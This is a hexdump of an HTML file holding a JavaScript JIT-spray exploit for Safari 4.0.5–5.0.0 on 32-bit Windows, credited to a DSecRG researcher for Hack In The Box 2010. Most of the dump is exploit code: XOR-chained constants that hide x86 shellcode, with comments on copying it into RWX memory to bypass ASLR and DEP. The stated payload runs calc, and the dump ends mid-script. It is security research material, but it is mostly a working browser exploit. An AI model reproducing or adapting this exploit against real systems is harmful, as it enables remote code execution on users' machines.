00000000  3c 21 2d 2d 0d 0a 4a 49  54 2d 53 50 52 41 59 20  |<!--..JIT-SPRAY |
00000010  66 6f 72 20 53 61 66 61  72 69 20 34 2e 30 2e 35  |for Safari 4.0.5|
00000020  20 2d 20 35 2e 30 2e 30  0d 0a 20 0d 0a 4a 61 76  | - 5.0.0.. ..Jav|
00000030  61 53 63 72 69 70 74 20  4a 49 54 20 53 48 45 4c  |aScript JIT SHEL|
00000040  4c 43 4f 44 45 20 61 6e  64 20 73 70 72 61 79 0d  |LCODE and spray.|
00000050  0a 20 20 20 20 20 20 20  20 20 20 20 20 20 66 6f  |.             fo|
00000060  72 0d 0a 20 20 20 20 20  20 20 20 20 41 53 4c 52  |r..         ASLR|
00000070  20 2f 20 44 45 50 20 62  79 70 61 73 73 20 28 57  | / DEP bypass (W|
00000080  69 6e 20 78 33 32 29 0d  0a 20 20 20 20 20 20 20  |in x32)..       |
00000090  20 20 20 0d 0a 42 79 20  41 6c 65 78 65 79 20 53  |   ..By Alexey S|
000000a0  69 6e 74 73 6f 76 0d 0a  20 20 20 66 72 6f 6d 20  |intsov..   from |
000000b0  44 69 67 69 74 61 6c 20  53 65 63 75 72 69 74 79  |Digital Security|
000000c0  20 52 65 73 65 61 72 63  68 20 47 72 6f 75 70 0d  | Research Group.|
000000d0  0a 20 0d 0a 53 70 65 63  69 61 6c 20 66 6f 72 20  |. ..Special for |
000000e0  48 61 63 6b 20 49 6e 20  54 68 65 20 42 6f 78 20  |Hack In The Box |
000000f0  32 30 31 30 20 41 6d 73  74 65 72 64 61 6d 0d 0a  |2010 Amsterdam..|
00000100  20 0d 0a 20 0d 0a 50 41  59 4c 4f 41 44 20 2d 20  | .. ..PAYLOAD - |
00000110  65 78 65 63 20 63 61 6c  63 0d 0a 54 65 73 74 65  |exec calc..Teste|
00000120  64 20 6f 6e 20 57 69 6e  64 6f 77 73 37 20 61 6e  |d on Windows7 an|
00000130  64 20 57 69 6e 64 6f 77  73 20 58 50 2e 20 28 53  |d Windows XP. (S|
00000140  6f 72 72 79 20 2d 20 68  61 76 65 20 6e 6f 74 20  |orry - have not |
00000150  4d 61 63 20 79 65 74 29  0d 0a 20 20 0d 0a 20 0d  |Mac yet)..  .. .|
00000160  0a 20 0d 0a 20 2d 20 48  6f 77 20 69 74 20 77 6f  |. .. - How it wo|
00000170  72 6b 73 3f 0d 0a 20 0d  0a 20 2d 20 41 6e 73 77  |rks?.. .. - Answ|
00000180  65 72 20 68 65 72 65 3a  0d 0a 20 68 74 74 70 3a  |er here:.. http:|
00000190  2f 2f 64 73 65 63 72 67  2e 63 6f 6d 2f 70 61 67  |//dsecrg.com/pag|
000001a0  65 73 2f 70 75 62 2f 73  68 6f 77 2e 70 68 70 3f  |es/pub/show.php?|
000001b0  69 64 3d 32 36 0d 0a 20  0d 0a 20 0d 0a 5b 44 53  |id=26.. .. ..[DS|
000001c0  65 63 52 47 5d 0d 0a 77  77 77 2e 64 73 65 63 72  |ecRG]..www.dsecr|
000001d0  67 2e 63 6f 6d 0d 0a 20  0d 0a 2d 2d 3e 0d 0a 3c  |g.com.. ..-->..<|
000001e0  73 63 72 69 70 74 3e 0d  0a 20 0d 0a 20 0d 0a 76  |script>.. .. ..v|
000001f0  61 72 20 53 50 52 41 59  3d 22 22 3b 0d 0a 20 0d  |ar SPRAY="";.. .|
00000200  0a 76 61 72 20 4a 49 54  3d 22 7b 20 22 2b 0d 0a  |.var JIT="{ "+..|
00000210  22 76 61 72 20 79 3d 28  22 2b 0d 0a 22 30 78 32  |"var y=("+.."0x2|
00000220  32 32 32 32 32 32 32 5e  22 2b 20 2f 2a 20 53 54  |2222222^"+ /* ST|
00000230  41 52 54 20 4f 46 20 4f  46 46 53 45 54 20 2a 2f  |ART OF OFFSET */|
00000240  0d 0a 22 30 78 32 32 32  32 32 32 32 32 5e 22 2b  |.."0x22222222^"+|
*
00000280  20 2f 2a 77 65 20 64 6f  6e 27 74 20 77 61 6e 6e  | /*we don't wann|
00000290  61 20 4e 55 4c 4c 53 20  69 6e 20 70 6f 69 6e 74  |a NULLS in point|
000002a0  65 72 2a 2f 0d 0a 22 30  78 32 32 32 32 32 32 32  |er*/.."0x2222222|
000002b0  32 5e 22 2b 0d 0a 22 30  78 32 32 32 32 32 32 32  |2^"+.."0x2222222|
*
000002e0  32 5e 22 2b 20 2f 2a 53  48 45 4c 4c 43 4f 44 45  |2^"+ /*SHELLCODE|
000002f0  20 42 45 47 49 4e 53 2a  2f 0d 0a 20 0d 0a 22 30  | BEGINS*/.. .."0|
00000300  78 31 34 65 62 63 30 33  31 5e 22 2b 20 2f 2f 20  |x14ebc031^"+ // |
00000310  78 6f 72 20 65 61 78 2c  65 61 78 20 20 3c 2d 2d  |xor eax,eax  <--|
00000320  2d 2d 2d 2d 2d 2d 2d 2d  2d 2d 2d 2d 2d 2d 2d 2d  |----------------|
00000330  20 45 49 50 3d 30 78 58  58 59 59 30 31 30 34 0d  | EIP=0xXXYY0104.|
00000340  0a 22 30 78 31 34 65 62  32 37 62 34 5e 22 2b 20  |."0x14eb27b4^"+ |
00000350  2f 2f 20 6d 6f 76 20 61  68 2c 20 32 37 20 20 20  |// mov ah, 27   |
00000360  20 3b 20 48 43 20 2d 20  43 48 41 4e 47 45 20 54  | ; HC - CHANGE T|
00000370  48 49 53 2c 20 69 66 20  75 20 77 61 6e 74 20 74  |HIS, if u want t|
00000380  6f 20 77 72 69 74 65 20  53 43 20 74 6f 20 61 6e  |o write SC to an|
00000390  6f 74 68 65 72 20 70 61  67 65 0d 0a 22 30 78 31  |other page.."0x1|
000003a0  34 65 62 33 35 62 30 5e  22 2b 20 2f 2f 20 6d 6f  |4eb35b0^"+ // mo|
000003b0  76 20 61 6c 2c 20 33 35  20 20 20 20 3b 20 48 43  |v al, 35    ; HC|
000003c0  20 2d 20 2d 2d 2d 2d 2d  2d 5e 0d 0a 22 30 78 31  | - ------^.."0x1|
000003d0  34 65 62 65 30 66 37 5e  22 2b 20 2f 2f 20 6d 75  |4ebe0f7^"+ // mu|
000003e0  6c 20 65 61 78 0d 0a 22  30 78 31 34 65 62 30 30  |l eax.."0x14eb00|
000003f0  62 30 5e 22 2b 20 2f 2f  20 6d 6f 76 20 61 6c 2c  |b0^"+ // mov al,|
00000400  20 30 30 0d 0a 22 30 78  31 34 65 62 30 30 62 34  | 00.."0x14eb00b4|
00000410  5e 22 2b 20 2f 2f 20 6e  6f 77 20 45 41 58 20 3d  |^"+ // now EAX =|
00000420  20 30 36 30 31 30 30 30  30 20 2d 20 52 57 58 20  | 06010000 - RWX |
00000430  6d 65 6d 6f 72 79 20 70  6f 69 6e 74 65 72 20 66  |memory pointer f|
00000440  6f 72 20 73 68 65 6c 6c  63 6f 64 65 0d 0a 22 30  |or shellcode.."0|
00000450  78 31 34 65 62 63 38 38  62 5e 22 2b 20 2f 2f 20  |x14ebc88b^"+ // |
00000460  6d 6f 76 20 65 63 78 2c  20 65 61 78 20 3b 20 6e  |mov ecx, eax ; n|
00000470  6f 77 20 45 43 58 20 69  73 20 70 6f 69 6e 74 65  |ow ECX is pointe|
00000480  72 20 6f 6e 20 52 57 58  20 6d 65 6d 0d 0a 20 0d  |r on RWX mem.. .|
00000490  0a 22 30 78 31 34 65 62  64 62 33 33 5e 22 2b 20  |."0x14ebdb33^"+ |
000004a0  2f 2f 20 78 6f 72 20 65  62 78 2c 20 65 62 78 0d  |// xor ebx, ebx.|
000004b0  0a 22 30 78 31 34 65 62  30 34 62 33 5e 22 2b 20  |."0x14eb04b3^"+ |
000004c0  2f 2f 20 6d 6f 76 20 62  6c 2c 20 34 20 20 20 20  |// mov bl, 4    |
000004d0  3b 20 45 42 58 20 3d 20  30 78 34 20 2d 20 73 74  |; EBX = 0x4 - st|
000004e0  65 70 20 74 6f 20 70 6f  69 6e 74 65 72 0d 0a 20  |ep to pointer.. |
000004f0  20 20 20 20 20 20 20 20  20 20 20 20 20 20 0d 0a  |              ..|
00000500  22 30 78 31 34 65 62 63  30 33 31 5e 22 2b 20 2f  |"0x14ebc031^"+ /|
00000510  2f 20 78 6f 72 20 65 61  78 2c 65 61 78 0d 0a 22  |/ xor eax,eax.."|
00000520  30 78 31 34 65 62 30 62  62 34 5e 22 2b 20 2f 2f  |0x14eb0bb4^"+ //|
00000530  20 6d 6f 76 20 61 68 2c  20 30 62 0d 0a 22 30 78  | mov ah, 0b.."0x|
00000540  31 34 65 62 62 35 62 30  5e 22 2b 20 2f 2f 20 6d  |14ebb5b0^"+ // m|
00000550  6f 76 20 61 6c 2c 20 66  63 0d 0a 22 30 78 31 34  |ov al, fc.."0x14|
00000560  65 62 65 30 66 37 5e 22  2b 20 2f 2f 20 6d 75 6c  |ebe0f7^"+ // mul|
00000570  20 65 61 78 20 20 20 20  3b 45 41 58 20 3d 20 30  | eax    ;EAX = 0|
00000580  30 38 39 78 78 79 79 0d  0a 22 30 78 31 34 65 62  |089xxyy.."0x14eb|
00000590  65 38 62 34 5e 22 2b 20  2f 2f 20 6d 6f 76 20 61  |e8b4^"+ // mov a|
000005a0  68 2c 20 65 38 0d 0a 22  30 78 31 34 65 62 66 63  |h, e8.."0x14ebfc|
000005b0  62 30 5e 22 2b 20 2f 2f  20 6d 6f 76 20 61 6c 2c  |b0^"+ // mov al,|
000005c0  20 66 63 20 3b 20 45 41  58 3d 30 30 38 39 45 38  | fc ; EAX=0089E8|
000005d0  46 43 20 2d 20 76 61 6c  75 65 20 6f 66 20 73 68  |FC - value of sh|
000005e0  65 6c 6c 63 6f 64 65 0d  0a 22 30 78 31 34 65 62  |ellcode.."0x14eb|
000005f0  30 31 38 39 5e 22 2b 20  2f 2f 20 6d 6f 76 20 5b  |0189^"+ // mov [|
00000600  65 63 78 5d 2c 20 65 61  78 20 3b 20 63 6f 70 79  |ecx], eax ; copy|
00000610  20 70 61 72 74 20 6f 66  20 73 68 65 6c 6c 63 6f  | part of shellco|
00000620  64 65 20 74 6f 20 52 57  58 20 70 61 67 65 0d 0a  |de to RWX page..|
00000630  22 30 78 31 34 65 62 63  30 33 31 5e 22 2b 20 2f  |"0x14ebc031^"+ /|
00000640  2f 20 78 6f 72 20 65 61  78 2c 65 61 78 0d 0a 22  |/ xor eax,eax.."|
00000650  30 78 31 34 65 62 62 62  62 34 5e 22 2b 20 2f 2f  |0x14ebbbb4^"+ //|
00000660  20 6d 6f 76 20 61 68 2c  20 62 62 0d 0a 22 30 78  | mov ah, bb.."0x|
00000670  31 34 65 62 38 38 62 30  5e 22 2b 20 2f 2f 20 6d  |14eb88b0^"+ // m|
00000680  6f 76 20 61 6c 2c 20 38  38 0d 0a 22 30 78 31 34  |ov al, 88.."0x14|
00000690  65 62 65 30 66 37 5e 22  2b 20 2f 2f 20 6d 75 6c  |ebe0f7^"+ // mul|
000006a0  20 65 61 78 20 20 3b 20  45 41 58 20 3d 20 38 39  | eax  ; EAX = 89|
000006b0  35 39 78 78 79 79 0d 0a  22 30 78 31 34 65 62 66  |59xxyy.."0x14ebf|
000006c0  66 62 34 5e 22 2b 20 2f  2f 20 6d 6f 76 20 61 68  |fb4^"+ // mov ah|
000006d0  2c 20 66 66 0d 0a 22 30  78 31 34 65 62 66 66 62  |, ff.."0x14ebffb|
000006e0  30 5e 22 2b 20 2f 2f 20  6d 6f 76 20 61 6c 2c 20  |0^"+ // mov al, |
000006f0  66 66 0d 0a 22 30 78 31  34 65 62 34 30 39 30 5e  |ff.."0x14eb4090^|
00000700  22 2b 20 2f 2f 20 69 6e  63 20 65 61 78 20 20 3b  |"+ // inc eax  ;|
00000710  20 45 41 58 20 3d 20 38  39 36 30 30 30 30 30 0d  | EAX = 89600000.|
00000720  0a 22 30 78 31 34 65 62  63 62 30 33 5e 22 2b 20  |."0x14ebcb03^"+ |
00000730  2f 2f 20 61 64 64 20 65  63 78 2c 20 65 62 78 20  |// add ecx, ebx |
00000740  3b 20 65 63 78 3d 65 63  78 2b 34 20 2d 20 6d 6f  |; ecx=ecx+4 - mo|
00000750  76 65 20 70 6f 69 6e 74  65 72 0d 0a 22 30 78 31  |ve pointer.."0x1|
00000760  34 65 62 30 31 38 39 5e  22 2b 20 2f 2f 20 6d 6f  |4eb0189^"+ // mo|
00000770  76 20 5b 65 63 78 5d 2c  20 65 61 78 20 3b 20 63  |v [ecx], eax ; c|
00000780  6f 70 79 20 70 61 72 74  20 6f 66 20 73 68 65 6c  |opy part of shel|
00000790  6c 63 6f 64 65 20 74 6f  20 52 57 58 20 70 61 67  |lcode to RWX pag|
000007a0  65 0d 0a 22 30 78 31 34  65 62 63 30 33 31 5e 22  |e.."0x14ebc031^"|
000007b0  2b 20 2f 2f 20 78 6f 72  20 65 61 78 2c 65 61 78  |+ // xor eax,eax|
000007c0  0d 0a 22 30 78 31 34 65  62 61 30 62 34 5e 22 2b  |.."0x14eba0b4^"+|
000007d0  20 2f 2f 20 6d 6f 76 20  61 68 2c 20 61 30 0d 0a  | // mov ah, a0..|
000007e0  22 30 78 31 34 65 62 61  38 62 30 5e 22 2b 20 2f  |"0x14eba8b0^"+ /|
000007f0  2f 20 6d 6f 76 20 61 6c  2c 20 61 38 0d 0a 22 30  |/ mov al, a8.."0|
00000800  78 31 34 65 62 65 30 66  37 5e 22 2b 20 2f 2f 20  |x14ebe0f7^"+ // |
00000810  45 41 58 20 3d 20 36 34  44 32 78 78 79 79 0d 0a  |EAX = 64D2xxyy..|
00000820  22 30 78 31 34 65 62 33  31 62 34 5e 22 2b 20 2f  |"0x14eb31b4^"+ /|
00000830  2f 20 6d 6f 76 20 61 68  2c 20 33 31 0d 0a 22 30  |/ mov ah, 31.."0|
00000840  78 31 34 65 62 65 35 62  30 5e 22 2b 20 2f 2f 20  |x14ebe5b0^"+ // |
00000850  6d 6f 76 20 61 6c 2c 20  65 35 20 3b 20 45 41 58  |mov al, e5 ; EAX|
00000860  20 3d 20 36 34 44 32 33  31 45 35 0d 0a 22 30 78  | = 64D231E5.."0x|
00000870  31 34 65 62 63 62 30 33  5e 22 2b 20 2f 2f 20 61  |14ebcb03^"+ // a|
00000880  64 64 20 65 63 78 2c 20  65 62 78 20 3b 20 65 63  |dd ecx, ebx ; ec|
00000890  78 3d 65 63 78 2b 34 20  2d 20 6d 6f 76 65 20 70  |x=ecx+4 - move p|
000008a0  6f 69 6e 74 65 72 0d 0a  22 30 78 31 34 65 62 30  |ointer.."0x14eb0|
000008b0  31 38 39 5e 22 2b 20 2f  2f 20 6d 6f 76 20 5b 65  |189^"+ // mov [e|
000008c0  63 78 5d 2c 20 65 61 78  20 3b 20 63 6f 70 79 20  |cx], eax ; copy |
000008d0  70 61 72 74 20 6f 66 20  73 68 65 6c 6c 63 6f 64  |part of shellcod|
000008e0  65 20 74 6f 20 52 57 58  20 70 61 67 65 0d 0a 20  |e to RWX page.. |
000008f0  0d 0a 22 30 78 31 34 65  62 63 30 33 31 5e 22 2b  |.."0x14ebc031^"+|
00000900  20 2f 2f 20 78 6f 72 20  65 61 78 2c 65 61 78 0d  | // xor eax,eax.|
00000910  0a 22 30 78 31 34 65 62  62 63 62 34 5e 22 2b 20  |."0x14ebbcb4^"+ |
00000920  2f 2f 20 6d 6f 76 20 61  68 2c 20 62 63 0d 0a 22  |// mov ah, bc.."|
00000930  30 78 31 34 65 62 63 34  62 30 5e 22 2b 20 2f 2f  |0x14ebc4b0^"+ //|
00000940  20 6d 6f 76 20 61 6c 2c  20 63 34 0d 0a 22 30 78  | mov al, c4.."0x|
00000950  31 34 65 62 65 30 66 37  5e 22 2b 20 2f 2f 20 45  |14ebe0f7^"+ // E|
00000960  41 58 20 3d 20 38 42 33  30 30 30 30 30 0d 0a 22  |AX = 8B300000.."|
00000970  30 78 31 34 65 62 35 32  62 34 5e 22 2b 20 2f 2f  |0x14eb52b4^"+ //|
00000980  20 6d 6f 76 20 61 68 2c  20 35 32 0d 0a 22 30 78  | mov ah, 52.."0x|
00000990  31 34 65 62 38 62 62 30  5e 22 2b 20 2f 2f 20 6d  |14eb8bb0^"+ // m|
000009a0  6f 76 20 61 6c 2c 20 38  62 20 3b 0d 0a 22 30 78  |ov al, 8b ;.."0x|
000009b0  31 34 65 62 63 62 30 33  5e 22 2b 20 2f 2f 20 61  |14ebcb03^"+ // a|
000009c0  64 64 20 65 63 78 2c 20  65 62 78 20 3b 20 65 63  |dd ecx, ebx ; ec|
000009d0  78 3d 65 63 78 2b 34 20  2d 20 6d 6f 76 65 20 70  |x=ecx+4 - move p|
000009e0  6f 69 6e 74 65 72 0d 0a  22 30 78 31 34 65 62 30  |ointer.."0x14eb0|
000009f0  31 38 39 5e 22 2b 20 2f  2f 20 6d 6f 76 20 5b 65  |189^"+ // mov [e|
00000a00  63 78 5d 2c 20 65 61 78  20 3b 20 63 6f 70 79 20  |cx], eax ; copy |
00000a10  70 61 72 74 20 6f 66 20  73 68 65 6c 6c 63 6f 64  |part of shellcod|
00000a20  65 20 74 6f 20 52 57 58  20 70 61 67 65 0d 0a 20  |e to RWX page.. |
00000a30  0d 0a 22 30 78 31 34 65  62 63 30 33 31 5e 22 2b  |.."0x14ebc031^"+|
00000a40  20 2f 2f 20 78 6f 72 20  65 61 78 2c 65 61 78 0d  | // xor eax,eax.|
00000a50  0a 22 30 78 31 34 65 62  39 31 62 34 5e 22 2b 20  |."0x14eb91b4^"+ |
00000a60  2f 2f 20 6d 6f 76 20 61  68 2c 20 39 31 0d 0a 22  |// mov ah, 91.."|
00000a70  30 78 31 34 65 62 35 65  62 30 5e 22 2b 20 2f 2f  |0x14eb5eb0^"+ //|
00000a80  20 6d 6f 76 20 61 6c 2c  20 35 65 0d 0a 22 30 78  | mov al, 5e.."0x|
00000a90  31 34 65 62 65 30 66 37  5e 22 2b 20 2f 2f 20 45  |14ebe0f7^"+ // E|
00000aa0  41 58 20 3d 20 35 32 38  42 30 30 30 30 0d 0a 22  |AX = 528B0000.."|
00000ab0  30 78 31 34 65 62 30 63  62 34 5e 22 2b 20 2f 2f  |0x14eb0cb4^"+ //|
00000ac0  20 6d 6f 76 20 61 68 2c  20 30 63 0d 0a 22 30 78  | mov ah, 0c.."0x|
00000ad0  31 34 65 62 35 32 62 30  5e 22 2b 20 2f 2f 20 6d  |14eb52b0^"+ // m|
00000ae0  6f 76 20 61 6c 2c 20 35  32 0d 0a 22 30 78 31 34  |ov al, 52.."0x14|
00000af0  65 62 63 62 30 33 5e 22  2b 20 2f 2f 20 61 64 64  |ebcb03^"+ // add|
00000b00  20 65 63 78 2c 20 65 62  78 20 3b 20 65 63 78 3d  | ecx, ebx ; ecx=|
00000b10  65 63 78 2b 34 20 2d 20  6d 6f 76 65 20 70 6f 69  |ecx+4 - move poi|
00000b20  6e 74 65 72 0d 0a 22 30  78 31 34 65 62 30 31 38  |nter.."0x14eb018|
00000b30  39 5e 22 2b 20 2f 2f 20  6d 6f 76 20 5b 65 63 78  |9^"+ // mov [ecx|
00000b40  5d 2c 20 65 61 78 20 3b  20 63 6f 70 79 20 70 61  |], eax ; copy pa|
00000b50  72 74 20 6f 66 20 73 68  65 6c 6c 63 6f 64 65 20  |rt of shellcode |
00000b60  74 6f 20 52 57 58 20 70  61 67 65 0d 0a 20 0d 0a  |to RWX page.. ..|
00000b70  22 30 78 31 34 65 62 63  30 33 31 5e 22 2b 20 2f  |"0x14ebc031^"+ /|
00000b80  2f 20 78 6f 72 20 65 61  78 2c 65 61 78 0d 0a 22  |/ xor eax,eax.."|
00000b90  30 78 31 34 65 62 36 35  62 34 5e 22 2b 20 2f 2f  |0x14eb65b4^"+ //|
00000ba0  20 6d 6f 76 20 61 68 2c  20 36 35 0d 0a 22 30 78  | mov ah, 65.."0x|
00000bb0  31 34 65 62 63 32 62 30  5e 22 2b 20 2f 2f 20 6d  |14ebc2b0^"+ // m|
00000bc0  6f 76 20 61 6c 2c 20 63  32 0d 0a 22 30 78 31 34  |ov al, c2.."0x14|
00000bd0  65 62 65 30 66 37 5e 22  2b 20 2f 2f 20 45 41 58  |ebe0f7^"+ // EAX|
00000be0  20 3d 20 32 38 37 32 30  30 30 30 0d 0a 22 30 78  | = 28720000.."0x|
00000bf0  31 34 65 62 38 62 62 34  5e 22 2b 20 2f 2f 20 6d  |14eb8bb4^"+ // m|
00000c00  6f 76 20 61 68 2c 20 38  62 0d 0a 22 30 78 31 34  |ov ah, 8b.."0x14|
00000c10  65 62 31 34 62 30 5e 22  2b 20 2f 2f 20 6d 6f 76  |eb14b0^"+ // mov|
00000c20  20 61 6c 2c 20 31 34 0d  0a 22 30 78 31 34 65 62  | al, 14.."0x14eb|
00000c30  63 62 30 33 5e 22 2b 20  2f 2f 20 61 64 64 20 65  |cb03^"+ // add e|
00000c40  63 78 2c 20 65 62 78 20  3b 20 65 63 78 3d 65 63  |cx, ebx ; ecx=ec|
00000c50  78 2b 34 20 2d 20 6d 6f  76 65 20 70 6f 69 6e 74  |x+4 - move point|
00000c60  65 72 0d 0a 22 30 78 31  34 65 62 30 31 38 39 5e  |er.."0x14eb0189^|
00000c70  22 2b 20 2f 2f 20 6d 6f  76 20 5b 65 63 78 5d 2c  |"+ // mov [ecx],|
00000c80  20 65 61 78 20 3b 20 63  6f 70 79 20 70 61 72 74  | eax ; copy part|
00000c90  20 6f 66 20 73 68 65 6c  6c 63 6f 64 65 20 74 6f  | of shellcode to|
00000ca0  20 52 57 58 20 70 61 67  65 0d 0a 20 0d 0a 22 30  | RWX page.. .."0|
00000cb0  78 31 34 65 62 63 30 33  31 5e 22 2b 20 2f 2f 20  |x14ebc031^"+ // |
00000cc0  78 6f 72 20 65 61 78 2c  65 61 78 0d 0a 22 30 78  |xor eax,eax.."0x|
00000cd0  31 34 65 62 36 33 62 34  5e 22 2b 20 2f 2f 20 6d  |14eb63b4^"+ // m|
00000ce0  6f 76 20 61 68 2c 20 36  33 0d 0a 22 30 78 31 34  |ov ah, 63.."0x14|
00000cf0  65 62 30 32 62 30 5e 22  2b 20 2f 2f 20 6d 6f 76  |eb02b0^"+ // mov|
00000d00  20 61 6c 2c 20 30 32 0d  0a 22 30 78 31 34 65 62  | al, 02.."0x14eb|
00000d10  65 30 66 37 5e 22 2b 20  2f 2f 20 45 41 58 0d 0a  |e0f7^"+ // EAX..|
00000d20  22 30 78 31 34 65 62 62  37 62 34 5e 22 2b 20 2f  |"0x14ebb7b4^"+ /|
00000d30  2f 20 6d 6f 76 20 61 68  2c 20 62 37 0d 0a 22 30  |/ mov ah, b7.."0|
00000d40  78 31 34 65 62 30 66 62  30 5e 22 2b 20 2f 2f 20  |x14eb0fb0^"+ // |
00000d50  6d 6f 76 20 61 6c 2c 20  30 66 0d 0a 22 30 78 31  |mov al, 0f.."0x1|
00000d60  34 65 62 63 62 30 33 5e  22 2b 20 2f 2f 20 61 64  |4ebcb03^"+ // ad|
00000d70  64 20 65 63 78 2c 20 65  62 78 20 3b 20 65 63 78  |d ecx, ebx ; ecx|
00000d80  3d 65 63 78 2b 34 20 2d  20 6d 6f 76 65 20 70 6f  |=ecx+4 - move po|
00000d90  69 6e 74 65 72 0d 0a 22  30 78 31 34 65 62 30 31  |inter.."0x14eb01|
00000da0  38 39 5e 22 2b 20 2f 2f  20 6d 6f 76 20 5b 65 63  |89^"+ // mov [ec|
00000db0  78 5d 2c 20 65 61 78 20  3b 20 63 6f 70 79 20 70  |x], eax ; copy p|
00000dc0  61 72 74 20 6f 66 20 73  68 65 6c 6c 63 6f 64 65  |art of shellcode|
00000dd0  20 74 6f 20 52 57 58 20  70 61 67 65 0d 0a 20 0d  | to RWX page.. .|
00000de0  0a 22 30 78 31 34 65 62  63 30 33 31 5e 22 2b 20  |."0x14ebc031^"+ |
00000df0  2f 2f 20 78 6f 72 20 65  61 78 2c 65 61 78 0d 0a  |// xor eax,eax..|
00000e00  22 30 78 31 34 65 62 64  64 62 34 5e 22 2b 20 2f  |"0x14ebddb4^"+ /|
00000e10  2f 20 6d 6f 76 20 61 68  2c 20 64 64 0d 0a 22 30  |/ mov ah, dd.."0|
00000e20  78 31 34 65 62 64 30 62  30 5e 22 2b 20 2f 2f 20  |x14ebd0b0^"+ // |
00000e30  6d 6f 76 20 61 6c 2c 20  64 30 0d 0a 22 30 78 31  |mov al, d0.."0x1|
00000e40  34 65 62 65 30 66 37 5e  22 2b 20 2f 2f 20 45 41  |4ebe0f7^"+ // EA|
00000e50  58 0d 0a 22 30 78 31 34  65 62 66 66 62 34 5e 22  |X.."0x14ebffb4^"|
00000e60  2b 20 2f 2f 20 6d 6f 76  20 61 68 2c 20 66 66 0d  |+ // mov ah, ff.|
00000e70  0a 22 30 78 31 34 65 62  66 66 62 30 5e 22 2b 20  |."0x14ebffb0^"+ |
00000e80  2f 2f 20 6d 6f 76 20 61  6c 2c 20 66 66 0d 0a 22  |// mov al, ff.."|
00000e90  30 78 31 34 65 62 34 30  39 30 5e 22 2b 20 2f 2f  |0x14eb4090^"+ //|
00000ea0  20 69 6e 63 20 65 61 78  0d 0a 22 30 78 31 34 65  | inc eax.."0x14e|
00000eb0  62 66 66 62 34 5e 22 2b  20 2f 2f 20 6d 6f 76 20  |bffb4^"+ // mov |
00000ec0  61 68 2c 20 62 37 0d 0a  22 30 78 31 34 65 62 33  |ah, b7.."0x14eb3|
00000ed0  31 62 30 5e 22 2b 20 2f  2f 20 6d 6f 76 20 61 6c  |1b0^"+ // mov al|
00000ee0  2c 20 30 66 0d 0a 22 30  78 31 34 65 62 63 62 30  |, 0f.."0x14ebcb0|
00000ef0  33 5e 22 2b 20 2f 2f 20  61 64 64 20 65 63 78 2c  |3^"+ // add ecx,|
00000f00  20 65 62 78 20 3b 20 65  63 78 3d 65 63 78 2b 34  | ebx ; ecx=ecx+4|
00000f10  20 2d 20 6d 6f 76 65 20  70 6f 69 6e 74 65 72 0d  | - move pointer.|
00000f20  0a 22 30 78 31 34 65 62  30 31 38 39 5e 22 2b 20  |."0x14eb0189^"+ |
00000f30  2f 2f 20 6d 6f 76 20 5b  65 63 78 5d 2c 20 65 61  |// mov [ecx], ea|
00000f40  78 20 3b 20 63 6f 70 79  20 70 61 72 74 20 6f 66  |x ; copy part of|
00000f50  20 73 68 65 6c 6c 63 6f  64 65 20 74 6f 20 52 57  | shellcode to RW|
00000f60  58 20 70 61 67 65 0d 0a  20 0d 0a 22 30 78 31 34  |X page.. .."0x14|
00000f70  65 62 63 30 33 31 5e 22  2b 20 2f 2f 20 78 6f 72  |ebc031^"+ // xor|
00000f80  20 65 61 78 2c 65 61 78  0d 0a 22 30 78 31 34 65  | eax,eax.."0x14e|
00000f90  62 62 32 62 34 5e 22 2b  20 2f 2f 20 6d 6f 76 20  |bb2b4^"+ // mov |
00000fa0  61 68 2c 20 62 32 0d 0a  22 30 78 31 34 65 62 37  |ah, b2.."0x14eb7|
00000fb0  31 62 30 5e 22 2b 20 2f  2f 20 6d 6f 76 20 61 6c  |1b0^"+ // mov al|
00000fc0  2c 20 37 31 0d 0a 22 30  78 31 34 65 62 65 30 66  |, 71.."0x14ebe0f|
00000fd0  37 5e 22 2b 20 2f 2f 20  45 41 58 0d 0a 22 30 78  |7^"+ // EAX.."0x|
00000fe0  31 34 65 62 33 63 62 34  5e 22 2b 20 2f 2f 20 6d  |14eb3cb4^"+ // m|
00000ff0  6f 76 20 61 68 2c 20 33  63 0d 0a 22 30 78 31 34  |ov ah, 3c.."0x14|
00001000  65 62 61 63 62 30 5e 22  2b 20 2f 2f 20 6d 6f 76  |ebacb0^"+ // mov|
00001010  20 61 6c 2c 20 61 63 0d  0a 22 30 78 31 34 65 62  | al, ac.."0x14eb|
00001020  63 62 30 33 5e 22 2b 20  2f 2f 20 61 64 64 20 65  |cb03^"+ // add e|
00001030  63 78 2c 20 65 62 78 20  3b 20 65 63 78 3d 65 63  |cx, ebx ; ecx=ec|
00001040  78 2b 34 20 2d 20 6d 6f  76 65 20 70 6f 69 6e 74  |x+4 - move point|
00001050  65 72 0d 0a 22 30 78 31  34 65 62 30 31 38 39 5e  |er.."0x14eb0189^|
00001060  22 2b 20 2f 2f 20 6d 6f  76 20 5b 65 63 78 5d 2c  |"+ // mov [ecx],|
00001070  20 65 61 78 20 3b 20 63  6f 70 79 20 70 61 72 74  | eax ; copy part|
00001080  20 6f 66 20 73 68 65 6c  6c 63 6f 64 65 20 74 6f  | of shellcode to|
00001090  20 52 57 58 20 70 61 67  65 0d 0a 20 0d 0a 22 30  | RWX page.. .."0|
000010a0  78 31 34 65 62 63 30 33  31 5e 22 2b 20 2f 2f 20  |x14ebc031^"+ // |
000010b0  78 6f 72 20 65 61 78 2c  65 61 78 0d 0a 22 30 78  |xor eax,eax.."0x|
000010c0  31 34 65 62 64 65 62 34  5e 22 2b 20 2f 2f 20 6d  |14ebdeb4^"+ // m|
000010d0  6f 76 20 61 68 2c 20 64  65 0d 0a 22 30 78 31 34  |ov ah, de.."0x14|
000010e0  65 62 35 61 62 30 5e 22  2b 20 2f 2f 20 6d 6f 76  |eb5ab0^"+ // mov|
000010f0  20 61 6c 2c 20 35 61 0d  0a 22 30 78 31 34 65 62  | al, 5a.."0x14eb|
00001100  65 30 66 37 5e 22 2b 20  2f 2f 20 45 41 58 0d 0a  |e0f7^"+ // EAX..|
00001110  22 30 78 31 34 65 62 32  63 62 34 5e 22 2b 20 2f  |"0x14eb2cb4^"+ /|
00001120  2f 20 6d 6f 76 20 61 68  2c 20 32 63 0d 0a 22 30  |/ mov ah, 2c.."0|
00001130  78 31 34 65 62 30 32 62  30 5e 22 2b 20 2f 2f 20  |x14eb02b0^"+ // |
00001140  6d 6f 76 20 61 6c 2c 20  30 32 0d 0a 22 30 78 31  |mov al, 02.."0x1|
